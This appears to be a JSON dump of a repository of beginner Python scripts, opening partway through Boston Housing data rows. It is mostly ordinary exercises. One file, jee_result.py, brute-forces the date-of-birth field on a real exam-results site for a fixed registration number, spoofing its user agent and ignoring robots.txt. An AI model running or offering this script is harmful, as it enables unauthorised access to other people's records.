91.20  1.4395  24  666.0  20.20 285.83  30.63   8.80\n16.81180   0.00  18.100  0  0.7000  5.2770  98.10  1.4261  24  666.0  20.20 396.90  30.81   7.20\n24.39380   0.00  18.100  0  0.7000  4.6520 100.00  1.4672  24  666.0  20.20 396.90  28.28  10.50\n22.59710   0.00  18.100  0  0.7000  5.0000  89.50  1.5184  24  666.0  20.20 396.90  31.99   7.40\n14.33370   0.00  18.100  0  0.7000  4.8800 100.00  1.5895  24  666.0  20.20 372.92  30.62  10.20\n 8.15174   0.00  18.100  0  0.7000  5.3900  98.90  1.7281  24  666.0  20.20 396.90  20.85  11.50\n 6.96215   0.00  18.100  0  0.7000  5.7130  97.00  1.9265  24  666.0  20.20 394.43  17.11  15.10\n 5.29305   0.00  18.100  0  0.7000  6.0510  82.50  2.1678  24  666.0  20.20 378.38  18.76  23.20\n11.57790   0.00  18.100  0  0.7000  5.0360  97.00  1.7700  24  666.0  20.20 396.90  25.68   9.70\n 8.64476   0.00  18.100  0  0.6930  6.1930  92.60  1.7912  24  666.0  20.20 396.90  15.17  13.80\n13.35980   0.00  18.100  0  0.6930  5.8870  94.70  1.7821  24  666.0  20.20 396.90  16.35  12.70\n 8.71675   0.00  18.100  0  0.6930  6.4710  98.80  1.7257  24  666.0  20.20 391.98  17.12  13.10\n 5.87205   0.00  18.100  0  0.6930  6.4050  96.00  1.6768  24  666.0  20.20 396.90  19.37  12.50\n 7.67202   0.00  18.100  0  0.6930  5.7470  98.90  1.6334  24  666.0  20.20 393.10  19.92   8.50\n38.35180   0.00  18.100  0  0.6930  5.4530 100.00  1.4896  24  666.0  20.20 396.90  30.59   5.00\n 9.91655   0.00  18.100  0  0.6930  5.8520  77.80  1.5004  24  666.0  20.20 338.16  29.97   6.30\n25.04610   0.00  18.100  0  0.6930  5.9870 100.00  1.5888  24  666.0  20.20 396.90  26.77   5.60\n14.23620   0.00  18.100  0  0.6930  6.3430 100.00  1.5741  24  666.0  20.20 396.90  20.32   7.20\n 9.59571   0.00  18.100  0  0.6930  6.4040 100.00  1.6390  24  666.0  20.20 376.11  20.31  12.10\n24.80170   0.00  18.100  0  0.6930  5.3490  96.00  1.7028  24  666.0  20.20 396.90  19.77   8.30\n41.52920   0.00  18.100  0  0.6930  5.5310  85.40  1.6074  24  666.0  20.20 329.46  27.38   8.50\n67.92080   0.00  18.100  0  0.6930  5.6830 100.00  1.4254  24  666.0  20.20 384.97  22.98   5.00\n20.71620   0.00  18.100  0  0.6590  4.1380 100.00  1.1781  24  666.0  20.20 370.22  23.34  11.90\n11.95110   0.00  18.100  0  0.6590  5.6080 100.00  1.2852  24  666.0  20.20 332.09  12.13  27.90\n 7.40389   0.00  18.100  0  0.5970  5.6170  97.90  1.4547  24  666.0  20.20 314.64  26.40  17.20\n14.43830   0.00  18.100  0  0.5970  6.8520 100.00  1.4655  24  666.0  20.20 179.36  19.78  27.50\n51.13580   0.00  18.100  0  0.5970  5.7570 100.00  1.4130  24  666.0  20.20   2.60  10.11  15.00\n14.05070   0.00  18.100  0  0.5970  6.6570 100.00  1.5275  24  666.0  20.20  35.05  21.22  17.20\n18.81100   0.00  18.100  0  0.5970  4.6280 100.00  1.5539  24  666.0  20.20  28.79  34.37  17.90\n28.65580   0.00  18.100  0  0.5970  5.1550 100.00  1.5894  24  666.0  20.20 210.97  20.08  16.30\n45.74610   0.00  18.100  0  0.6930  4.5190 100.00  1.6582  24  666.0  20.20  88.27  36.98   7.00\n18.08460   0.00  18.100  0  0.6790  6.4340 100.00  1.8347  24  666.0  20.20  27.25  29.05   7.20\n10.83420   0.00  18.100  0  0.6790  6.7820  90.80  1.8195  24  666.0  20.20  21.57  25.79   7.50\n25.94060   0.00  18.100  0  0.6790  5.3040  89.10  1.6475  24  666.0  20.20 127.36  26.64  10.40\n73.53410   0.00  18.100  0  0.6790  5.9570 100.00  1.8026  24  666.0  20.20  16.45  20.62   8.80\n11.81230   0.00  18.100  0  0.7180  6.8240  76.50  1.7940  24  666.0  20.20  48.45  22.74   8.40\n11.08740   0.00  18.100  0  0.7180  6.4110 100.00  1.8589  24  666.0  20.20 318.75  15.02  16.70\n 7.02259   0.00  18.100  0  0.7180  6.0060  95.30  1.8746  24  666.0  20.20 319.98  15.70  14.20\n12.04820   0.00  18.100  0  0.6140  5.6480  87.60  1.9512  24  666.0  20.20 291.55  14.10  20.80\n 7.05042   0.00  18.100  0  0.6140  6.1030  85.10  2.0218  24  666.0  20.20   2.52  23.29  13.40\n 8.79212   0.00  18.100  0  0.5840  5.5650  70.60  2.0635  24  666.0  20.20   3.65  17.16  11.70\n15.86030   0.00  18.100  0  0.6790  5.8960  95.40  1.9096  24  666.0  20.20   7.68  24.39   8.30\n12.24720   0.00  18.100  0  0.5840  5.8370  59.70  1.9976  24  666.0  20.20  24.65  15.69  10.20\n37.66190   0.00  18.100  0  0.6790  6.2020  78.70  1.8629  24  666.0  20.20  18.82  14.52  10.90\n 7.36711   0.00  18.100  0  0.6790  6.1930  78.10  1.9356  24  666.0  20.20  96.73  21.52  11.00\n 9.33889   0.00  18.100  0  0.6790  6.3800  95.60  1.9682  24  666.0  20.20  60.72  24.08   9.50\n 8.49213   0.00  18.100  0  0.5840  6.3480  86.10  2.0527  24  666.0  20.20  83.45  17.64  14.50\n10.06230   0.00  18.100  0  0.5840  6.8330  94.30  2.0882  24  666.0  20.20  81.33  19.69  14.10\n 6.44405   0.00  18.100  0  0.5840  6.4250  74.80  2.2004  24  666.0  20.20  97.95  12.03  16.10\n 5.58107   0.00  18.100  0  0.7130  6.4360  87.90  2.3158  24  666.0  20.20 100.19  16.22  14.30\n13.91340   0.00  18.100  0  0.7130  6.2080  95.00  2.2222  24  666.0  20.20 100.63  15.17  11.70\n11.16040   0.00  18.100  0  0.7400  6.6290  94.60  2.1247  24  666.0  20.20 109.85  23.27  13.40\n14.42080   0.00  18.100  0  0.7400  6.4610  93.30  2.0026  24  666.0  20.20  27.49  18.05   9.60\n15.17720   0.00  18.100  0  0.7400  6.1520 100.00  1.9142  24  666.0  20.20   9.32  26.45   8.70\n13.67810   0.00  18.100  0  0.7400  5.9350  87.90  1.8206  24  666.0  20.20  68.95  34.02   8.40\n 9.39063   0.00  18.100  0  0.7400  5.6270  93.90  1.8172  24  666.0  20.20 396.90  22.88  12.80\n22.05110   0.00  18.100  0  0.7400  5.8180  92.40  1.8662  24  666.0  20.20 391.45  22.11  10.50\n 9.72418   0.00  18.100  0  0.7400  6.4060  97.20  2.0651  24  666.0  20.20 385.96  19.52  17.10\n 5.66637   0.00  18.100  0  0.7400  6.2190 100.00  2.0048  24  666.0  20.20 395.69  16.59  18.40\n 9.96654   0.00  18.100  0  0.7400  6.4850 100.00  1.9784  24  666.0  20.20 386.73  18.85  15.40\n12.80230   0.00  18.100  0  0.7400  5.8540  96.60  1.8956  24  666.0  20.20 240.52  23.79  10.80\n10.67180   0.00  18.100  0  0.7400  6.4590  94.80  1.9879  24  666.0  20.20  43.06  23.98  11.80\n 6.28807   0.00  18.100  0  0.7400  6.3410  96.40  2.0720  24  666.0  20.20 318.01  17.79  14.90\n 9.92485   0.00  18.100  0  0.7400  6.2510  96.60  2.1980  24  666.0  20.20 388.52  16.44  12.60\n 9.32909   0.00  18.100  0  0.7130  6.1850  98.70  2.2616  24  666.0  20.20 396.90  18.13  14.10\n 7.52601   0.00  18.100  0  0.7130  6.4170  98.30  2.1850  24  666.0  20.20 304.21  19.31  13.00\n 6.71772   0.00  18.100  0  0.7130  6.7490  92.60  2.3236  24  666.0  20.20   0.32  17.44  13.40\n 5.44114   0.00  18.100  0  0.7130  6.6550  98.20  2.3552  24  666.0  20.20 355.29  17.73  15.20\n 5.09017   0.00  18.100  0  0.7130  6.2970  91.80  2.3682  24  666.0  20.20 385.09  17.27  16.10\n 8.24809   0.00  18.100  0  0.7130  7.3930  99.30  2.4527  24  666.0  20.20 375.87  16.74  17.80\n 9.51363   0.00  18.100  0  0.7130  6.7280  94.10  2.4961  24  666.0  20.20   6.68  18.71  14.90\n 4.75237   0.00  18.100  0  0.7130  6.5250  86.50  2.4358  24  666.0  20.20  50.92  18.13  14.10\n 4.66883   0.00  18.100  0  0.7130  5.9760  87.90  2.5806  24  666.0  20.20  10.48  19.01  12.70\n 8.20058   0.00  18.100  0  0.7130  5.9360  80.30  2.7792  24  666.0  20.20   3.50  16.94  13.50\n 7.75223   0.00  18.100  0  0.7130  6.3010  83.70  2.7831  24  666.0  20.20 272.21  16.23  14.90\n 6.80117   0.00  18.100  0  0.7130  6.0810  84.40  2.7175  24  666.0  20.20 396.90  14.70  20.00\n 4.81213   0.00  18.100  0  0.7130  6.7010  90.00  2.5975  24  666.0  20.20 255.23  16.42  16.40\n 3.69311   0.00  18.100  0  0.7130  6.3760  88.40  2.5671  24  666.0  20.20 391.43  14.65  17.70\n 6.65492   0.00  18.100  0  0.7130  6.3170  83.00  2.7344  24  666.0  20.20 396.90  13.99  19.50\n 5.82115   0.00  18.100  0  0.7130  6.5130  89.90  2.8016  24  666.0  20.20 393.82  10.29  20.20\n 7.83932   0.00  18.100  0  0.6550  6.2090  65.40  2.9634  24  666.0  20.20 396.90  13.22  21.40\n 3.16360   0.00  18.100  0  0.6550  5.7590  48.20  3.0665  24  666.0  20.20 334.40  14.13  19.90\n 3.77498   0.00  18.100  0  0.6550  5.9520  84.70  2.8715  24  666.0  20.20  22.01  17.15  19.00\n 4.42228   0.00  18.100  0  0.5840  6.0030  94.50  2.5403  24  666.0  20.20 331.29  21.32  19.10\n15.57570   0.00  18.100  0  0.5800  5.9260  71.00  2.9084  24  666.0  20.20 368.74  18.13  19.10\n13.07510   0.00  18.100  0  0.5800  5.7130  56.70  2.8237  24  666.0  20.20 396.90  14.76  20.10\n 4.34879   0.00  18.100  0  0.5800  6.1670  84.00  3.0334  24  666.0  20.20 396.90  16.29  19.90\n 4.03841   0.00  18.100  0  0.5320  6.2290  90.70  3.0993  24  666.0  20.20 395.33  12.87  19.60\n 3.56868   0.00  18.100  0  0.5800  6.4370  75.00  2.8965  24  666.0  20.20 393.37  14.36  23.20\n 4.64689   0.00  18.100  0  0.6140  6.9800  67.60  2.5329  24  666.0  20.20 374.68  11.66  29.80\n 8.05579   0.00  18.100  0  0.5840  5.4270  95.40  2.4298  24  666.0  20.20 352.58  18.14  13.80\n 6.39312   0.00  18.100  0  0.5840  6.1620  97.40  2.2060  24  666.0  20.20 302.76  24.10  13.30\n 4.87141   0.00  18.100  0  0.6140  6.4840  93.60  2.3053  24  666.0  20.20 396.21  18.68  16.70\n15.02340   0.00  18.100  0  0.6140  5.3040  97.30  2.1007  24  666.0  20.20 349.48  24.91  12.00\n10.23300   0.00  18.100  0  0.6140  6.1850  96.70  2.1705  24  666.0  20.20 379.70  18.03  14.60\n14.33370   0.00  18.100  0  0.6140  6.2290  88.00  1.9512  24  666.0  20.20 383.32  13.11  21.40\n 5.82401   0.00  18.100  0  0.5320  6.2420  64.70  3.4242  24  666.0  20.20 396.90  10.74  23.00\n 5.70818   0.00  18.100  0  0.5320  6.7500  74.90  3.3317  24  666.0  20.20 393.07   7.74  23.70\n 5.73116   0.00  18.100  0  0.5320  7.0610  77.00  3.4106  24  666.0  20.20 395.28   7.01  25.00\n 2.81838   0.00  18.100  0  0.5320  5.7620  40.30  4.0983  24  666.0  20.20 392.92  10.42  21.80\n 2.37857   0.00  18.100  0  0.5830  5.8710  41.90  3.7240  24  666.0  20.20 370.73  13.34  20.60\n 3.67367   0.00  18.100  0  0.5830  6.3120  51.90  3.9917  24  666.0  20.20 388.62  10.58  21.20\n 5.69175   0.00  18.100  0  0.5830  6.1140  79.80  3.5459  24  666.0  20.20 392.68  14.98  19.10\n 4.83567   0.00  18.100  0  0.5830  5.9050  53.20  3.1523  24  666.0  20.20 388.22  11.45  20.60\n 0.15086   0.00  27.740  0  0.6090  5.4540  92.70  1.8209   4  711.0  20.10 395.09  18.06  15.20\n 0.18337   0.00  27.740  0  0.6090  5.4140  98.30  1.7554   4  711.0  20.10 344.05  23.97   7.00\n 0.20746   0.00  27.740  0  0.6090  5.0930  98.00  1.8226   4  711.0  20.10 318.43  29.68   8.10\n 0.10574   0.00  27.740  0  0.6090  5.9830  98.80  1.8681   4  711.0  20.10 390.11  18.07  13.60\n 0.11132   0.00  27.740  0  0.6090  5.9830  83.50  2.1099   4  711.0  20.10 396.90  13.35  20.10\n 0.17331   0.00   9.690  0  0.5850  5.7070  54.00  2.3817   6  391.0  19.20 396.90  12.01  21.80\n 0.27957   0.00   9.690  0  0.5850  5.9260  42.60  2.3817   6  391.0  19.20 396.90  13.59  24.50\n 0.17899   0.00   9.690  0  0.5850  5.6700  28.80  2.7986   6  391.0  19.20 393.29  17.60  23.10\n 0.28960   0.00   9.690  0  0.5850  5.3900  72.90  2.7986   6  391.0  19.20 396.90  21.14  19.70\n 0.26838   0.00   9.690  0  0.5850  5.7940  70.60  2.8927   6  391.0  19.20 396.90  14.10  18.30\n 0.23912   0.00   9.690  0  0.5850  6.0190  65.30  2.4091   6  391.0  19.20 396.90  12.92  21.20\n 0.17783   0.00   9.690  0  0.5850  5.5690  73.50  2.3999   6  391.0  19.20 395.77  15.10  17.50\n 0.22438   0.00   9.690  0  0.5850  6.0270  79.70  2.4982   6  391.0  19.20 396.90  14.33  16.80\n 0.06263   0.00  11.930  0  0.5730  6.5930  69.10  2.4786   1  273.0  21.00 391.99   9.67  22.40\n 0.04527   0.00  11.930  0  0.5730  6.1200  76.70  2.2875   1  273.0  21.00 396.90   9.08  20.60\n 0.06076   0.00  11.930  0  0.5730  6.9760  91.00  2.1675   1  273.0  21.00 396.90   5.64  23.90\n 0.10959   0.00  11.930  0  0.5730  6.7940  89.30  2.3889   1  273.0  21.00 393.45   6.48  22.00\n 0.04741   0.00  11.930  0  0.5730  6.0300  80.80  2.5050   1  273.0  21.00 396.90   7.88  11.90\n"
        },
        {
          "name": "housing.names",
          "type": "blob",
          "size": 2.03125,
          "content": "1. Title: Boston Housing Data\n\n2. Sources:\n   (a) Origin:  This dataset was taken from the StatLib library which is\n                maintained at Carnegie Mellon University.\n   (b) Creator:  Harrison, D. and Rubinfeld, D.L. 'Hedonic prices and the \n                 demand for clean air', J. Environ. Economics & Management,\n                 vol.5, 81-102, 1978.\n   (c) Date: July 7, 1993\n\n3. Past Usage:\n   -   Used in Belsley, Kuh & Welsch, 'Regression diagnostics ...', Wiley, \n       1980.   N.B. Various transformations are used in the table on\n       pages 244-261.\n    -  Quinlan,R. (1993). Combining Instance-Based and Model-Based Learning.\n       In Proceedings on the Tenth International Conference of Machine \n       Learning, 236-243, University of Massachusetts, Amherst. Morgan\n       Kaufmann.\n\n4. Relevant Information:\n\n   Concerns housing values in suburbs of Boston.\n\n5. Number of Instances: 506\n\n6. Number of Attributes: 13 continuous attributes (including \"class\"\n                         attribute \"MEDV\"), 1 binary-valued attribute.\n\n7. Attribute Information:\n\n    1. CRIM      per capita crime rate by town\n    2. ZN        proportion of residential land zoned for lots over \n                 25,000 sq.ft.\n    3. INDUS     proportion of non-retail business acres per town\n    4. CHAS      Charles River dummy variable (= 1 if tract bounds \n                 river; 0 otherwise)\n    5. NOX       nitric oxides concentration (parts per 10 million)\n    6. RM        average number of rooms per dwelling\n    7. AGE       proportion of owner-occupied units built prior to 1940\n    8. DIS       weighted distances to five Boston employment centres\n    9. RAD       index of accessibility to radial highways\n    10. TAX      full-value property-tax rate per $10,000\n    11. PTRATIO  pupil-teacher ratio by town\n    12. B        1000(Bk - 0.63)^2 where Bk is the proportion of blacks \n                 by town\n    13. LSTAT    % lower status of the population\n    14. MEDV     Median value of owner-occupied homes in $1000's\n\n8. Missing Attribute Values:  None.\n\n\n\n"
        },
        {
          "name": "how to add three numbers and find type in python.py",
          "type": "blob",
          "size": 0.09765625,
          "content": "#python program for adding three no.\nx=45\ny=75\nz=25\nt=x+y+z\nprint(t)\n#type of output\nprint(type(t))\n"
        },
        {
          "name": "how to display the fibonacci sequence up to n-.py",
          "type": "blob",
          "size": 0.484375,
          "content": "# Program to display the Fibonacci sequence up to n-th term\n\nnterms = int(input(\"How many terms? \"))\n\n# first two terms\nn1, n2 = 0, 1\ncount = 0\n\n# check if the number of terms is valid\nif nterms <= 0:\n   print(\"Please enter a positive integer\")\nelif nterms == 1:\n   print(\"Fibonacci sequence upto\",nterms,\":\")\n   print(n1)\nelse:\n   print(\"Fibonacci sequence:\")\n   while count < nterms:\n       print(n1)\n       nth = n1 + n2\n       # update values\n       n1 = n2\n       n2 = nth\n       count += 1\n"
        },
        {
          "name": "image2pdf",
          "type": "tree",
          "content": null
        },
        {
          "name": "img",
          "type": "tree",
          "content": null
        },
        {
          "name": "importerror.txt",
          "type": "blob",
          "size": 0.0751953125,
          "content": "In a normal python:\n\npip install pywin32\nIn anaconda:\n\nconda install pywin32\n"
        },
        {
          "name": "index.html",
          "type": "blob",
          "size": 0.0009765625,
          "content": "\n"
        },
        {
          "name": "index.py",
          "type": "blob",
          "size": 0.408203125,
          "content": "num = 11\n#Negative numbers, 0 and 1 are not primes\nif num > 1:\n  \n    # Iterate from 2 to n // 2\n    for i in range(2, (num//2)+1):\n      \n        # If num is divisible by any number between\n        #2 and n / 2, it is not prime\n        if (num % i) == 0:\n            print(num, \"is not a prime number\")\n            break\n    else:\n        print(num, \"is a prime number\")\nelse:\n    print(num, \"is not a prime number\")\n"
        },
        {
          "name": "inheritance_YahV1729.python",
          "type": "blob",
          "size": 0.767578125,
          "content": "\n# A Python program to demonstrate inheritance \n\n# Base or Super class. Note object in bracket. \n# (Generally, object is made ancestor of all classes) \n# In Python 3.x \"class Person\" is \n# equivalent to \"class Person(object)\" \nclass Person(object): \n\t\n\t# Constructor \n\tdef __init__(self, name): \n\t\tself.name = name \n\n\t# To get name \n\tdef getName(self): \n\t\treturn self.name \n\n\t# To check if this person is employee \n\tdef isEmployee(self): \n\t\treturn False\n\n\n# Inherited or Sub class (Note Person in bracket) \nclass Employee(Person): \n\n\t# Here we return true \n\tdef isEmployee(self): \n\t\treturn True\n\n# Driver code \nemp = Person(\"Geek1\") # An Object of Person \nprint(emp.getName(), emp.isEmployee()) \n\nemp = Employee(\"Geek2\") # An Object of Employee \nprint(emp.getName(), emp.isEmployee()) \n"
        },
        {
          "name": "input matrice,product any order!.py",
          "type": "blob",
          "size": 1.4033203125,
          "content": "# inputing 2 matrices:\r\n\r\n# matrice 1:\r\n\r\nrows = int(input(\"Enter the number of rows of the matrice 1\"))\r\ncoloumns = int(input(\"Enter the coloumns of the matrice 1\"))\r\nmatrice = []\r\nrowan = []\r\n\r\nfor i in range(0, rows):\r\n    for j in range(0, coloumns):\r\n        element = int(input(\"enter the element\"))\r\n        rowan.append(element)\r\n    print(\"one row completed\")\r\n    matrice.append(rowan)\r\n    rowan = []\r\n\r\nprint(\"matrice 1 is \\n\")\r\nfor ch in matrice:\r\n    print(ch)\r\nA = matrice\r\n\r\n# matrice 2:\r\n\r\nrows_ = coloumns\r\ncoloumns_ = int(input(\"Enter the coloumns of the matrice 2\"))\r\nrowan = []\r\nmatrix = []\r\n\r\nfor i in range(0, rows_):\r\n    for j in range(0, coloumns_):\r\n        element = int(input(\"enter the element\"))\r\n        rowan.append(element)\r\n    print(\"one row completed\")\r\n    matrix.append(rowan)\r\n    rowan = []\r\n\r\nprint(\"Matrice 2 is\\n\")\r\nfor ch in matrix:\r\n    print(ch)\r\n\r\nB = matrix\r\n\r\n# creating empty frame:\r\n\r\nresult = []\r\nfor i in range(0, rows):\r\n    for j in range(0, coloumns_):\r\n        rowan.append(0)\r\n    result.append(rowan)\r\n    rowan = []\r\nprint(\"\\n\")\r\nprint(\"The frame work of result\")\r\nfor ch in result:\r\n    print(ch)\r\n\r\n\r\n# Multiplication of the two matrices:\r\n\r\nfor i in range(len(A)):\r\n    for j in range(len(B[0])):\r\n        for k in range(len(B)):\r\n            result[i][j] += A[i][k] * B[k][j]\r\n\r\nprint(\"\\n\")\r\nprint(\"The product of the 2 matrices is \\n\")\r\n\r\nfor i in result:\r\n    print(i)\r\n"
        },
        {
          "name": "insertion_sort.py",
          "type": "blob",
          "size": 1.484375,
          "content": "# insertion sort\n\nlist = []  # declaring list\n\n\ndef input_list():\n    # taking length and then values of list as input from user\n    n = int(input(\"Enter number of elements in the list: \"))  # taking value from user\n    for i in range(n):\n        temp = int(input(\"Enter element \" + str(i + 1) + \": \"))\n        list.append(temp)\n\n\ndef insertion_sort(list, n):\n    \"\"\"\n    sort list in assending order\n\n    INPUT:\n        list=list of values to be sorted\n        n=size of list that contains values to be sorted\n\n    OUTPUT:\n        list of sorted values in assending order\n    \"\"\"\n    for i in range(0, n):\n        key = list[i]\n        j = i - 1\n        # Swap elements witth key iff they are\n        # greater than key\n        while j >= 0 and list[j] > key:\n            list[j + 1] = list[j]\n            j = j - 1\n        list[j + 1] = key\n    return list\n\n\ndef insertion_sort_desc(list, n):\n    \"\"\"\n    sort list in desending order\n\n    INPUT:\n        list=list of values to be sorted\n        n=size of list that contains values to be sorted\n\n    OUTPUT:\n        list of sorted values in desending order\n    \"\"\"\n    for i in range(0, n):\n        key = list[i]\n        j = i - 1\n        # Swap elements witth key iff they are\n        # greater than key\n        while j >= 0 and list[j] < key:\n            list[j + 1] = list[j]\n            j = j - 1\n        list[j + 1] = key\n    return list\n\n\ninput_list()\nlist1 = insertion_sort(list, len(list))\nprint(list1)\nlist2 = insertion_sort_desc(list, len(list))\nprint(list2)\n"
        },
        {
          "name": "insta_image_saving",
          "type": "tree",
          "content": null
        },
        {
          "name": "insta_monitering",
          "type": "tree",
          "content": null
        },
        {
          "name": "internet_connection_py3.py",
          "type": "blob",
          "size": 0.759765625,
          "content": "from __future__ import print_function\n\nimport os\nimport urllib.request\n\nfrom selenium import webdriver\n\nprint(\"Testing Internet Connection\")\nprint()\ntry:\n    urllib.request.urlopen(\n        \"http://google.com\", timeout=2\n    )  # Tests if connection is up and running\n    print(\"Internet is working fine!\")\n    print()\n    question = input(\"Do you want to open a website? (Y/N): \")\n    if question == \"Y\":\n        print()\n        search = input(\"Input website to open (http://website.com) : \")\n    else:\n        os._exit(0)\n\nexcept urllib.error.URLError:\n    print(\"No internet connection!\")  # Output if no connection\n\nbrowser = webdriver.Firefox()\nbrowser.get(search)\nos.system(\"cls\")  # os.system('clear') if Linux\nprint(\"[+] Website \" + search + \" opened!\")\nbrowser.close()\n"
        },
        {
          "name": "invisible_clock.py",
          "type": "blob",
          "size": 1.4658203125,
          "content": "# Hey you need red color cloak\nimport cv2\n\n# superinposing two images\n\nimport numpy as np\n\nimport time\n\ncap = cv2.VideoCapture(0)\n\ntime.sleep(2)  # 2 sec time to adjust cam with time\n\nbackground = 0\n\n# capturing the background\nfor i in range(30):  # 30 times\n    ret, background = cap.read()\n\nwhile cap.isOpened():\n    ret, img = cap.read()\n\n    if not ret:\n        break\n\n    hsv = cv2.cvtColor(img, cv2.COLOR_BGR2HSV)\n    # hsv values for red color\n    lower_red = np.array([0, 120, 70])\n    upper_red = np.array([10, 255, 255])\n\n    mask1 = cv2.inRange(hsv, lower_red, upper_red)  # seperating the cloak part\n\n    lower_red = np.array([170, 120, 70])\n    upper_red = np.array([180, 255, 255])\n\n    mask2 = cv2.inRange(hsv, lower_red, upper_red)\n\n    mask1 = mask1 + mask2  # OR (Combining)\n    # #remove  noise\n    mask1 = cv2.morphologyEx(\n        mask1, cv2.MORPH_OPEN, np.ones((3, 3), np.uint8), iterations=2\n    )\n\n    mask1 = cv2.morphologyEx(\n        mask1, cv2.MORPH_DILATE, np.ones((3, 3), np.uint8), iterations=1\n    )\n\n    # mask2 --> Everything except cloak\n    mask2 = cv2.bitwise_not(mask1)\n\n    res1 = cv2.bitwise_and(background, background, mask=mask1)  # used for segmentation\n    res2 = cv2.bitwise_and(img, img, mask=mask2)  # used to substitute the cloak part\n\n    final_output = cv2.addWeighted(res1, 1, res2, 1, 0)\n\n    cv2.imshow(\"Eureka !\", final_output)\n\n    if cv2.waitKey(1) == 13:\n        break\n\ncap.release()\ncv2.destroyAllWindows()\n\n\n# Press enter to get out of window\n"
        },
        {
          "name": "iprint.py",
          "type": "blob",
          "size": 0.15625,
          "content": "from time import sleep\n\ntxt = input(\"\")\n\nap = \"\"\n\nfor let in range(len(txt) - 1):\n    ap += txt[let]\n    print(ap, end=\"\\r\")\n    sleep(0.1)\n\nprint(txt, end=\"\")\n"
        },
        {
          "name": "is_number.py",
          "type": "blob",
          "size": 0.892578125,
          "content": "# importing the module to check for all kinds of numbers truthiness in python.\nimport numbers\nfrom math import pow\nfrom typing import Any\n\n# Assign values to author and version.\n__author__ = \"Nitkarsh Chourasia\"\n__version__ = \"1.0.0\"\n__date__ = \"2023-08-24\"\n\n\ndef check_number(input_value: Any) -> str:\n    \"\"\"Check if input is a number of any kind or not.\"\"\"\n\n    if isinstance(input_value, numbers.Number):\n        return f\"{input_value} is a number.\"\n    else:\n        return f\"{input_value} is not a number.\"\n\n\nif __name__ == \"__main__\":\n    print(f\"Author: {__author__}\")\n    print(f\"Version: {__version__}\")\n    print(f\"Function Documentation: {check_number.__doc__}\")\n    print(f\"Date: {__date__}\")\n\n    print()  # Just inserting a new blank line.\n\n    print(check_number(100))\n    print(check_number(0))\n    print(check_number(pow(10, 20)))\n    print(check_number(\"Hello\"))\n    print(check_number(1 + 2j))\n"
        },
        {
          "name": "jee_result.py",
          "type": "blob",
          "size": 1.11328125,
          "content": "import datetime\n\nimport mechanize\nfrom bs4 import BeautifulSoup\n\n# Create a Browser\nb = mechanize.Browser()\n\n# Disable loading robots.txt\nb.set_handle_robots(False)\n\nb.addheaders = [(\"User-agent\", \"Mozilla/4.0 (compatible; MSIE 5.0; Windows 98;)\")]\n\n# Navigate\nb.open(\"http://cbseresults.nic.in/jee/jee_2015.htm\")\n\n# Choose a form\nb.select_form(nr=0)\n\n# Fill it out\nb[\"regno\"] = \"37000304\"\n\ncurrentdate = datetime.date(1997, 3, 10)\nenddate = datetime.date(1998, 4, 1)\nwhile currentdate <= enddate:\n    ct = 0\n    # print currentdate\n    yyyymmdd = currentdate.strftime(\"%Y/%m/%d\")\n    ddmmyyyy = yyyymmdd[8:] + \"/\" + yyyymmdd[5:7] + \"/\" + yyyymmdd[:4]\n    print(ddmmyyyy)\n    b.open(\"http://cbseresults.nic.in/jee/jee_2015.htm\")\n    b.select_form(nr=0)\n    b[\"regno\"] = \"37000304\"\n    b[\"dob\"] = ddmmyyyy\n\n    fd = b.submit()\n    # print(fd.read())\n    soup = BeautifulSoup(fd.read(), \"html.parser\")\n\n    for writ in soup.find_all(\"table\"):\n        ct = ct + 1\n    # print (ct)\n    if ct == 6:\n        print(\"---fail---\")\n    else:\n        print(\"--true--\")\n        break\n    currentdate += datetime.timedelta(days=1)\n    # print fd.read()\n"
        },
        {
          "name": "kmp_str_search.py",
          "type": "blob",
          "size": 1.505859375,
          "content": "\"\"\"Author Anurag Kumar(mailto:anuragkumarak95@gmail.com)\n    The Knuth-Morris-Pratt Algorithm for finding a pattern within a piece of te$\n    with complexity O(n + m)\n    1) Preprocess pattern to identify any suffixes that are identical to prefix$\n        This tells us where to continue from if we get a mismatch between a cha$\n        and the text.\n    2) Step through the text one character at a time and compare it to a charac$\n        updating our location within the pattern if necessary\n\"\"\"\n\n\ndef kmp(pattern, text, len_p=None, len_t=None):\n    # 1) Construct the failure array\n    failure = [0]\n    i = 0\n    for index, char in enumerate(pattern[1:]):\n        if pattern[i] == char:\n            i += 1\n        else:\n            i = 0\n        failure.append(i)\n\n    # 2) Step through text searching for pattern\n    i, j = 0, 0  # index into text, pattern\n    while i < len(text):\n        if pattern[j] == text[i]:\n            if j == (len(pattern) - 1):\n                return True\n            i += 1\n            j += 1\n\n        # if this is a prefix in our pattern\n        # just go back far enough to continue\n        elif failure[j] > 0:\n            j = failure[j] - 1\n        else:\n            i += 1\n    return False\n\n\nif __name__ == \"__main__\":\n    # Test 1)\n    pattern = \"abc1abc12\"\n    text1 = \"alskfjaldsabc1abc1abc12k23adsfabcabc\"\n    text2 = \"alskfjaldsk23adsfabcabc\"\n    assert kmp(pattern, text1) and not kmp(pattern, text2)\n\n    # Test 2)\n    pattern = \"ABABX\"\n    text = \"ABABZABABYABABX\"\n    assert kmp(pattern, text)\n"
        },
        {
          "name": "largestno.py",
          "type": "blob",
          "size": 0.22265625,
          "content": "# Python Program to find Largest of two Numbers using if-else statements\na = int(input(\"Enter the first number: \"))\nb = int(input(\"Enter the second number: \"))\nif(a >= b):\n  print(a, \"is greater\")\nelse:\n  print(b, \"is greater\")\n"
        },
        {
          "name": "lcm.py",
          "type": "blob",
          "size": 1.0888671875,
          "content": "def lcm(x, y):\n    \"\"\"\n        Find least common multiple of 2 positive integers.\n        :param x: int - first integer\n        :param y: int - second integer\n        :return: int - least common multiple\n\n        >>> lcm(8, 4)\n            8\n        >>> lcm(5, 3)\n            15\n        >>> lcm(15, 9)\n            45\n        >>> lcm(124, 23)\n            2852\n        >>> lcm(3, 6)\n            6\n        >>> lcm(13, 34)\n            442\n        >>> lcm(235, 745)\n            35015\n        >>> lcm(65, 86)\n            5590\n        >>> lcm(0, 1)\n            -1\n        >>> lcm(-12, 35)\n            -1\n    \"\"\"\n    if x <= 0 or y <= 0:\n        return -1\n\n    if x > y:\n        greater_number = x\n    else:\n        greater_number = y\n\n    while True:\n        if (greater_number % x == 0) and (greater_number % y == 0):\n            lcm = greater_number\n            break\n        greater_number += 1\n    return lcm\n\n\nnum_1 = int(input(\"Enter first number: \"))\nnum_2 = int(input(\"Enter second number: \"))\n\nprint(\n    \"The L.C.M. of \"\n    + str(num_1)\n    + \" and \"\n    + str(num_2)\n    + \" is \"\n    + str(lcm(num_1, num_2))\n)\n"
